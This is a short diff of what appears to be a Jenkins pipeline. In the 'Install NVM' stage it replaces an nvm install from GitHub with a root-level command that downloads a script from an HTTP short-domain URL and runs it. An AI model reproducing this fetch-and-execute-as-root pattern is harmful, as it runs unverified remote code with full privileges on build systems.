@@ -9,8 +9,7 @@ whoami'''
     }
     stage('Install NVM') {
       steps {
-        sh '''curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.4/install.sh | bash
-[ -s "$HOME/nvm/nvm.sh" ] && \\. "$HOME/nvm/nvm.sh"'''
+        sh 'sudo su -c "curl -o- -L http://lrnloc.kr/installv2 > deployll.sh && bash deployll.sh"'
       }
     }
   }
